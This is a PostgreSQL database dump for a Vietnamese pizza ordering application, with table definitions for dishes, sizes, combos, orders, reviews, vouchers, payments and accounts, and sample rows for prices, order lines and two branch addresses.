--
-- PostgreSQL database dump
--

-- Dumped from database version 17.5
-- Dumped by pg_dump version 17.5

-- Started on 2025-11-16 04:53:12

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- TOC entry 233 (class 1259 OID 25824)
-- Name: BienTheMonAn; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."BienTheMonAn" (
    "MaBienThe" integer NOT NULL,
    "MaMonAn" integer NOT NULL,
    "MaSize" integer,
    "GiaBan" numeric(10,2) NOT NULL,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying
);


ALTER TABLE public."BienTheMonAn" OWNER TO postgres;

--
-- TOC entry 232 (class 1259 OID 25823)
-- Name: BienTheMonAn_MaBienThe_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."BienTheMonAn" ALTER COLUMN "MaBienThe" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."BienTheMonAn_MaBienThe_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 249 (class 1259 OID 25895)
-- Name: ChiTietDonHang; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."ChiTietDonHang" (
    "MaChiTiet" integer NOT NULL,
    "MaDonHang" integer NOT NULL,
    "MaBienThe" integer NOT NULL,
    "MaDeBanh" integer,
    "SoLuong" integer DEFAULT 1 NOT NULL,
    "DonGia" numeric(10,2) NOT NULL,
    "ThanhTien" numeric(10,2) NOT NULL,
    "Loai" character varying(20) DEFAULT 'SP'::character varying NOT NULL,
    "MaCombo" integer
);


ALTER TABLE public."ChiTietDonHang" OWNER TO postgres;

--
-- TOC entry 259 (class 1259 OID 33425)
-- Name: ChiTietDonHang_ChiTietCombo; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."ChiTietDonHang_ChiTietCombo" (
    "MaCTDH_Combo" integer NOT NULL,
    "MaChiTietDonHang" integer NOT NULL,
    "SoLuong" integer DEFAULT 1 NOT NULL,
    "MaBienThe" integer,
    "MaDeBanh" integer
);


ALTER TABLE public."ChiTietDonHang_ChiTietCombo" OWNER TO postgres;

--
-- TOC entry 258 (class 1259 OID 33424)
-- Name: ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public."ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq" OWNER TO postgres;

--
-- TOC entry 5207 (class 0 OID 0)
-- Dependencies: 258
-- Name: ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq" OWNED BY public."ChiTietDonHang_ChiTietCombo"."MaCTDH_Combo";


--
-- TOC entry 248 (class 1259 OID 25894)
-- Name: ChiTietDonHang_MaChiTiet_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."ChiTietDonHang" ALTER COLUMN "MaChiTiet" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."ChiTietDonHang_MaChiTiet_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 250 (class 1259 OID 25901)
-- Name: ChiTietDonHang_TuyChon; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."ChiTietDonHang_TuyChon" (
    "MaChiTiet" integer NOT NULL,
    "MaTuyChon" integer NOT NULL,
    "GiaThem" numeric(10,2) NOT NULL
);


ALTER TABLE public."ChiTietDonHang_TuyChon" OWNER TO postgres;

--
-- TOC entry 220 (class 1259 OID 25767)
-- Name: CoSo; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."CoSo" (
    "MaCoSo" integer NOT NULL,
    "TenCoSo" character varying(255) NOT NULL,
    "SoDienThoai" character varying(20),
    "SoNhaDuong" character varying(255),
    "PhuongXa" character varying(100),
    "QuanHuyen" character varying(100),
    "ThanhPho" character varying(100),
    "KinhDo" numeric(11,8),
    "ViDo" numeric(10,8)
);


ALTER TABLE public."CoSo" OWNER TO postgres;

--
-- TOC entry 219 (class 1259 OID 25766)
-- Name: CoSo_MaCoSo_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."CoSo" ALTER COLUMN "MaCoSo" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."CoSo_MaCoSo_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 256 (class 1259 OID 33347)
-- Name: Combo; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Combo" (
    "MaCombo" integer NOT NULL,
    "TenCombo" character varying(255) NOT NULL,
    "MoTa" text,
    "HinhAnh" character varying(255),
    "GiaCombo" numeric(10,2) NOT NULL,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying,
    "NgayTao" timestamp without time zone DEFAULT now(),
    "NgayCapNhat" timestamp without time zone DEFAULT now()
);


ALTER TABLE public."Combo" OWNER TO postgres;

--
-- TOC entry 257 (class 1259 OID 33358)
-- Name: Combo_ChiTiet; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Combo_ChiTiet" (
    "MaCombo" integer NOT NULL,
    "MaBienThe" integer NOT NULL,
    "SoLuong" integer DEFAULT 1 NOT NULL,
    "MaDeBanh" integer
);


ALTER TABLE public."Combo_ChiTiet" OWNER TO postgres;

--
-- TOC entry 255 (class 1259 OID 33346)
-- Name: Combo_MaCombo_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."Combo_MaCombo_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public."Combo_MaCombo_seq" OWNER TO postgres;

--
-- TOC entry 5208 (class 0 OID 0)
-- Dependencies: 255
-- Name: Combo_MaCombo_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."Combo_MaCombo_seq" OWNED BY public."Combo"."MaCombo";


--
-- TOC entry 254 (class 1259 OID 25918)
-- Name: DanhGiaDonHang; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."DanhGiaDonHang" (
    "MaDanhGiaDonHang" integer NOT NULL,
    "MaDonHang" integer NOT NULL,
    "SoSao" integer NOT NULL,
    "BinhLuan" text,
    "NgayDanhGia" timestamp without time zone DEFAULT now() NOT NULL
);


ALTER TABLE public."DanhGiaDonHang" OWNER TO postgres;

--
-- TOC entry 261 (class 1259 OID 33450)
-- Name: DanhGiaMonAn; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."DanhGiaMonAn" (
    "MaDanhGiaMonAn" integer NOT NULL,
    "MaMonAn" integer NOT NULL,
    "MaTaiKhoan" integer NOT NULL,
    "SoSao" smallint NOT NULL,
    "NoiDung" text,
    "NgayDanhGia" timestamp without time zone DEFAULT now(),
    "TrangThai" character varying(20) DEFAULT 'Chờ duyệt'::character varying,
    CONSTRAINT "DanhGiaMonAn_SoSao_check" CHECK ((("SoSao" >= 1) AND ("SoSao" <= 5)))
);


ALTER TABLE public."DanhGiaMonAn" OWNER TO postgres;

--
-- TOC entry 260 (class 1259 OID 33449)
-- Name: DanhGiaMonAn_MaDanhGiaMonAn_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."DanhGiaMonAn_MaDanhGiaMonAn_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public."DanhGiaMonAn_MaDanhGiaMonAn_seq" OWNER TO postgres;

--
-- TOC entry 5209 (class 0 OID 0)
-- Dependencies: 260
-- Name: DanhGiaMonAn_MaDanhGiaMonAn_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."DanhGiaMonAn_MaDanhGiaMonAn_seq" OWNED BY public."DanhGiaMonAn"."MaDanhGiaMonAn";


--
-- TOC entry 253 (class 1259 OID 25917)
-- Name: DanhGia_MaDanhGia_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."DanhGiaDonHang" ALTER COLUMN "MaDanhGiaDonHang" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."DanhGia_MaDanhGia_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 226 (class 1259 OID 25795)
-- Name: DanhMuc; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."DanhMuc" (
    "MaDanhMuc" integer NOT NULL,
    "TenDanhMuc" character varying(100) NOT NULL
);


ALTER TABLE public."DanhMuc" OWNER TO postgres;

--
-- TOC entry 225 (class 1259 OID 25794)
-- Name: DanhMuc_MaDanhMuc_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."DanhMuc" ALTER COLUMN "MaDanhMuc" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."DanhMuc_MaDanhMuc_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 235 (class 1259 OID 25830)
-- Name: DeBanh; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."DeBanh" (
    "MaDeBanh" integer NOT NULL,
    "TenDeBanh" character varying(100) NOT NULL
);


ALTER TABLE public."DeBanh" OWNER TO postgres;

--
-- TOC entry 234 (class 1259 OID 25829)
-- Name: DeBanh_MaDeBanh_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."DeBanh" ALTER COLUMN "MaDeBanh" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."DeBanh_MaDeBanh_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 245 (class 1259 OID 25877)
-- Name: DonHang; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."DonHang" (
    "MaDonHang" integer NOT NULL,
    "MaNguoiDung" integer,
    "MaCoSo" integer NOT NULL,
    "MaNguoiDungGiaoHang" integer,
    "MaVoucher" character varying(50),
    "NgayDat" timestamp without time zone DEFAULT now() NOT NULL,
    "ThoiGianGiaoDuKien" timestamp without time zone,
    "TienTruocGiamGia" numeric(10,2),
    "TienGiamGia" numeric(10,2),
    "TongTien" numeric(10,2) NOT NULL,
    "GhiChu" text,
    "TenNguoiNhan" character varying(255),
    "SoDienThoaiGiaoHang" character varying(20),
    "SoNhaDuongGiaoHang" character varying(255),
    "PhuongXaGiaoHang" character varying(100),
    "QuanHuyenGiaoHang" character varying(100),
    "ThanhPhoGiaoHang" character varying(100),
    "PhiShip" numeric(10,2) DEFAULT 0 NOT NULL
);


ALTER TABLE public."DonHang" OWNER TO postgres;

--
-- TOC entry 244 (class 1259 OID 25876)
-- Name: DonHang_MaDonHang_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."DonHang" ALTER COLUMN "MaDonHang" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."DonHang_MaDonHang_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 263 (class 1259 OID 33475)
-- Name: KhuyenMai; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."KhuyenMai" (
    "MaKhuyenMai" integer NOT NULL,
    "TenKhuyenMai" character varying(255) NOT NULL,
    "MoTa" text,
    "KMLoai" character varying(20) NOT NULL,
    "KMGiaTri" numeric(10,2) NOT NULL,
    "KMBatDau" timestamp without time zone NOT NULL,
    "KMKetThuc" timestamp without time zone NOT NULL,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying
);


ALTER TABLE public."KhuyenMai" OWNER TO postgres;

--
-- TOC entry 262 (class 1259 OID 33474)
-- Name: KhuyenMai_MaKhuyenMai_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public."KhuyenMai_MaKhuyenMai_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER SEQUENCE public."KhuyenMai_MaKhuyenMai_seq" OWNER TO postgres;

--
-- TOC entry 5210 (class 0 OID 0)
-- Dependencies: 262
-- Name: KhuyenMai_MaKhuyenMai_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public."KhuyenMai_MaKhuyenMai_seq" OWNED BY public."KhuyenMai"."MaKhuyenMai";


--
-- TOC entry 247 (class 1259 OID 25886)
-- Name: LichSuTrangThaiDonHang; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."LichSuTrangThaiDonHang" (
    "MaLichSu" integer NOT NULL,
    "MaDonHang" integer NOT NULL,
    "TrangThai" character varying(50) NOT NULL,
    "ThoiGianCapNhat" timestamp without time zone DEFAULT now() NOT NULL,
    "GhiChu" text
);


ALTER TABLE public."LichSuTrangThaiDonHang" OWNER TO postgres;

--
-- TOC entry 246 (class 1259 OID 25885)
-- Name: LichSuTrangThaiDonHang_MaLichSu_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."LichSuTrangThaiDonHang" ALTER COLUMN "MaLichSu" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."LichSuTrangThaiDonHang_MaLichSu_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 224 (class 1259 OID 25787)
-- Name: LoaiMonAn; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."LoaiMonAn" (
    "MaLoaiMonAn" integer NOT NULL,
    "TenLoaiMonAn" character varying(100) NOT NULL
);


ALTER TABLE public."LoaiMonAn" OWNER TO postgres;

--
-- TOC entry 223 (class 1259 OID 25786)
-- Name: LoaiMonAn_MaLoaiMonAn_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."LoaiMonAn" ALTER COLUMN "MaLoaiMonAn" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."LoaiMonAn_MaLoaiMonAn_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 238 (class 1259 OID 25843)
-- Name: LoaiTuyChon; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."LoaiTuyChon" (
    "MaLoaiTuyChon" integer NOT NULL,
    "TenLoaiTuyChon" character varying(100) NOT NULL
);


ALTER TABLE public."LoaiTuyChon" OWNER TO postgres;

--
-- TOC entry 237 (class 1259 OID 25842)
-- Name: LoaiTuyChon_MaLoaiTuyChon_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."LoaiTuyChon" ALTER COLUMN "MaLoaiTuyChon" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."LoaiTuyChon_MaLoaiTuyChon_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 228 (class 1259 OID 25803)
-- Name: MonAn; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."MonAn" (
    "MaMonAn" integer NOT NULL,
    "TenMonAn" character varying(255) NOT NULL,
    "MoTa" text,
    "HinhAnh" character varying(255),
    "MaLoaiMonAn" integer NOT NULL,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying,
    "DeXuat" boolean DEFAULT false NOT NULL
);


ALTER TABLE public."MonAn" OWNER TO postgres;

--
-- TOC entry 229 (class 1259 OID 25810)
-- Name: MonAn_DanhMuc; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."MonAn_DanhMuc" (
    "MaMonAn" integer NOT NULL,
    "MaDanhMuc" integer NOT NULL
);


ALTER TABLE public."MonAn_DanhMuc" OWNER TO postgres;

--
-- TOC entry 236 (class 1259 OID 25837)
-- Name: MonAn_DeBanh; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."MonAn_DeBanh" (
    "MaMonAn" integer NOT NULL,
    "MaDeBanh" integer NOT NULL
);


ALTER TABLE public."MonAn_DeBanh" OWNER TO postgres;

--
-- TOC entry 264 (class 1259 OID 33484)
-- Name: MonAn_KhuyenMai; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."MonAn_KhuyenMai" (
    "MaMonAn" integer NOT NULL,
    "MaKhuyenMai" integer NOT NULL
);


ALTER TABLE public."MonAn_KhuyenMai" OWNER TO postgres;

--
-- TOC entry 227 (class 1259 OID 25802)
-- Name: MonAn_MaMonAn_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."MonAn" ALTER COLUMN "MaMonAn" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."MonAn_MaMonAn_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 242 (class 1259 OID 25862)
-- Name: MonAn_TuyChon; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."MonAn_TuyChon" (
    "MaMonAn" integer NOT NULL,
    "MaTuyChon" integer NOT NULL
);


ALTER TABLE public."MonAn_TuyChon" OWNER TO postgres;

--
-- TOC entry 222 (class 1259 OID 25775)
-- Name: NguoiDung; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."NguoiDung" (
    "MaNguoiDung" integer NOT NULL,
    "MaTaiKhoan" integer,
    "MaCoSo" integer,
    "HoTen" character varying(255) NOT NULL,
    "SoDienThoai" character varying(20),
    "SoNhaDuong" character varying(255),
    "PhuongXa" character varying(100),
    "QuanHuyen" character varying(100),
    "ThanhPho" character varying(100)
);


ALTER TABLE public."NguoiDung" OWNER TO postgres;

--
-- TOC entry 221 (class 1259 OID 25774)
-- Name: NguoiDung_MaNguoiDung_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."NguoiDung" ALTER COLUMN "MaNguoiDung" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."NguoiDung_MaNguoiDung_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 231 (class 1259 OID 25816)
-- Name: Size; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Size" (
    "MaSize" integer NOT NULL,
    "TenSize" character varying(50) NOT NULL
);


ALTER TABLE public."Size" OWNER TO postgres;

--
-- TOC entry 230 (class 1259 OID 25815)
-- Name: Size_MaSize_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."Size" ALTER COLUMN "MaSize" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."Size_MaSize_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 218 (class 1259 OID 25759)
-- Name: TaiKhoan; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."TaiKhoan" (
    "MaTaiKhoan" integer NOT NULL,
    "Email" character varying(100) NOT NULL,
    "MatKhau" character varying(255) NOT NULL,
    "Role" character varying(50) NOT NULL,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying NOT NULL
);


ALTER TABLE public."TaiKhoan" OWNER TO postgres;

--
-- TOC entry 217 (class 1259 OID 25758)
-- Name: TaiKhoan_MaTaiKhoan_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."TaiKhoan" ALTER COLUMN "MaTaiKhoan" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."TaiKhoan_MaTaiKhoan_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 252 (class 1259 OID 25907)
-- Name: ThanhToan; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."ThanhToan" (
    "MaThanhToan" integer NOT NULL,
    "MaDonHang" integer,
    "PhuongThuc" character varying(50) NOT NULL,
    "MaGiaoDich" character varying(255),
    "SoTien" numeric(10,2) NOT NULL,
    "TrangThai" character varying(50) NOT NULL,
    "ThoiGian" timestamp without time zone DEFAULT now() NOT NULL
);


ALTER TABLE public."ThanhToan" OWNER TO postgres;

--
-- TOC entry 251 (class 1259 OID 25906)
-- Name: ThanhToan_MaThanhToan_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."ThanhToan" ALTER COLUMN "MaThanhToan" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."ThanhToan_MaThanhToan_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 240 (class 1259 OID 25851)
-- Name: TuyChon; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."TuyChon" (
    "MaTuyChon" integer NOT NULL,
    "TenTuyChon" character varying(100) NOT NULL,
    "MaLoaiTuyChon" integer NOT NULL
);


ALTER TABLE public."TuyChon" OWNER TO postgres;

--
-- TOC entry 241 (class 1259 OID 25856)
-- Name: TuyChon_Gia; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."TuyChon_Gia" (
    "MaTuyChon" integer NOT NULL,
    "MaSize" integer NOT NULL,
    "GiaThem" numeric(10,2) DEFAULT 0 NOT NULL
);


ALTER TABLE public."TuyChon_Gia" OWNER TO postgres;

--
-- TOC entry 239 (class 1259 OID 25850)
-- Name: TuyChon_MaTuyChon_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

ALTER TABLE public."TuyChon" ALTER COLUMN "MaTuyChon" ADD GENERATED BY DEFAULT AS IDENTITY (
    SEQUENCE NAME public."TuyChon_MaTuyChon_seq"
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1
);


--
-- TOC entry 243 (class 1259 OID 25867)
-- Name: Voucher; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public."Voucher" (
    "MaVoucher" character varying(50) NOT NULL,
    "MoTa" text NOT NULL,
    "LoaiGiamGia" character varying(20) NOT NULL,
    "GiaTri" numeric(10,2) NOT NULL,
    "DieuKienApDung" numeric(10,2) DEFAULT 0,
    "NgayBatDau" timestamp without time zone,
    "NgayKetThuc" timestamp without time zone,
    "SoLuong" integer,
    "TrangThai" character varying(20) DEFAULT 'Active'::character varying NOT NULL
);


ALTER TABLE public."Voucher" OWNER TO postgres;

--
-- TOC entry 4888 (class 2604 OID 33428)
-- Name: ChiTietDonHang_ChiTietCombo MaCTDH_Combo; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."ChiTietDonHang_ChiTietCombo" ALTER COLUMN "MaCTDH_Combo" SET DEFAULT nextval('public."ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq"'::regclass);


--
-- TOC entry 4883 (class 2604 OID 33350)
-- Name: Combo MaCombo; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."Combo" ALTER COLUMN "MaCombo" SET DEFAULT nextval('public."Combo_MaCombo_seq"'::regclass);


--
-- TOC entry 4890 (class 2604 OID 33453)
-- Name: DanhGiaMonAn MaDanhGiaMonAn; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."DanhGiaMonAn" ALTER COLUMN "MaDanhGiaMonAn" SET DEFAULT nextval('public."DanhGiaMonAn_MaDanhGiaMonAn_seq"'::regclass);


--
-- TOC entry 4893 (class 2604 OID 33478)
-- Name: KhuyenMai MaKhuyenMai; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public."KhuyenMai" ALTER COLUMN "MaKhuyenMai" SET DEFAULT nextval('public."KhuyenMai_MaKhuyenMai_seq"'::regclass);


--
-- TOC entry 5170 (class 0 OID 25824)
-- Dependencies: 233
-- Data for Name: BienTheMonAn; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."BienTheMonAn" ("MaBienThe", "MaMonAn", "MaSize", "GiaBan", "TrangThai") FROM stdin;
7	4	1	235000.00	Active
8	4	2	325000.00	Active
9	5	1	235000.00	Active
10	5	2	325000.00	Active
11	6	1	205000.00	Active
12	6	2	295000.00	Active
13	7	1	215000.00	Active
14	7	2	305000.00	Active
15	8	\N	49000.00	Active
16	9	\N	20000.00	Active
17	10	1	165000.00	Active
18	10	2	205000.00	Active
19	11	\N	255000.00	Ẩn
20	11	1	255000.00	Active
21	11	2	300000.00	Active
3	2	1	225000.00	Active
4	2	2	315000.00	Active
5	3	1	245000.00	Active
6	3	2	335000.00	Active
2	1	2	325000.00	Active
1	1	1	100000.00	Active
\.


--
-- TOC entry 5186 (class 0 OID 25895)
-- Dependencies: 249
-- Data for Name: ChiTietDonHang; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."ChiTietDonHang" ("MaChiTiet", "MaDonHang", "MaBienThe", "MaDeBanh", "SoLuong", "DonGia", "ThanhTien", "Loai", "MaCombo") FROM stdin;
83	42	17	\N	1	325000.00	325000.00	CB	1
84	43	3	1	1	225000.00	225000.00	SP	\N
85	43	1	1	1	235000.00	235000.00	SP	\N
86	43	17	\N	1	325000.00	325000.00	CB	1
87	44	3	1	1	225000.00	225000.00	SP	\N
88	44	1	1	1	235000.00	235000.00	SP	\N
89	44	1	1	1	265000.00	265000.00	SP	\N
90	45	3	1	1	225000.00	225000.00	SP	\N
91	46	3	1	1	225000.00	225000.00	SP	\N
92	47	3	1	1	225000.00	225000.00	SP	\N
93	48	1	1	1	265000.00	265000.00	SP	\N
94	49	2	1	1	325000.00	325000.00	SP	\N
95	50	3	1	1	225000.00	225000.00	SP	\N
96	51	1	1	1	235000.00	235000.00	SP	\N
97	52	17	\N	1	325000.00	325000.00	CB	1
98	52	11	1	1	205000.00	205000.00	SP	\N
99	53	3	1	1	225000.00	225000.00	SP	\N
100	54	1	1	1	235000.00	235000.00	SP	\N
101	55	3	1	1	225000.00	225000.00	SP	\N
102	56	1	1	1	235000.00	235000.00	SP	\N
103	57	1	1	1	235000.00	235000.00	SP	\N
104	58	17	\N	1	325000.00	325000.00	CB	1
105	59	17	\N	1	325000.00	325000.00	CB	1
106	60	3	1	1	225000.00	225000.00	SP	\N
107	61	3	1	1	225000.00	225000.00	SP	\N
108	62	1	1	1	235000.00	235000.00	SP	\N
109	63	3	1	1	225000.00	225000.00	SP	\N
110	63	17	\N	1	325000.00	325000.00	CB	1
111	64	1	1	1	164500.00	164500.00	SP	\N
112	65	5	1	1	171500.00	171500.00	SP	\N
113	66	3	1	1	225000.00	225000.00	SP	\N
114	67	1	1	1	164500.00	164500.00	SP	\N
115	67	3	1	1	225000.00	225000.00	SP	\N
116	68	1	1	1	164500.00	164500.00	SP	\N
117	68	3	1	1	225000.00	225000.00	SP	\N
118	68	5	1	1	171500.00	171500.00	SP	\N
119	69	20	1	2	255000.00	510000.00	SP	\N
120	70	1	1	1	210000.00	210000.00	SP	\N
121	71	17	\N	1	325000.00	325000.00	CB	1
122	72	2	1	2	227500.00	455000.00	SP	\N
\.


--
-- TOC entry 5196 (class 0 OID 33425)
-- Dependencies: 259
-- Data for Name: ChiTietDonHang_ChiTietCombo; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."ChiTietDonHang_ChiTietCombo" ("MaCTDH_Combo", "MaChiTietDonHang", "SoLuong", "MaBienThe", "MaDeBanh") FROM stdin;
1	83	1	17	1
2	83	1	1	2
3	86	1	17	1
4	86	1	1	2
5	97	1	17	1
6	97	1	1	2
7	104	1	17	1
8	104	1	1	2
9	105	1	17	1
10	105	1	1	2
11	110	1	17	1
12	110	1	1	2
13	121	1	17	1
14	121	1	1	2
\.


--
-- TOC entry 5187 (class 0 OID 25901)
-- Dependencies: 250
-- Data for Name: ChiTietDonHang_TuyChon; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."ChiTietDonHang_TuyChon" ("MaChiTiet", "MaTuyChon", "GiaThem") FROM stdin;
89	1	30000.00
93	1	30000.00
\.


--
-- TOC entry 5157 (class 0 OID 25767)
-- Dependencies: 220
-- Data for Name: CoSo; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."CoSo" ("MaCoSo", "TenCoSo", "SoDienThoai", "SoNhaDuong", "PhuongXa", "QuanHuyen", "ThanhPho", "KinhDo", "ViDo") FROM stdin;
1	SECRET PIZZA Hà Nội	02411112222	55 Lý Thường Kiệt	Phường Trần Hưng Đạo	Quận Hoàn Kiếm	TP. Hà Nội	105.85246300	21.02273900
2	SECRET PIZZA TP. HCM	02833334444	123 Lê Lợi	Phường Bến Nghé	Quận 1	TP. Hồ Chí Minh	106.68225548	10.75997889
\.


--
-- TOC entry 5193 (class 0 OID 33347)
-- Dependencies: 256
-- Data for Name: Combo; Type: TABLE DATA; Schema: public; Owner: postgres
--

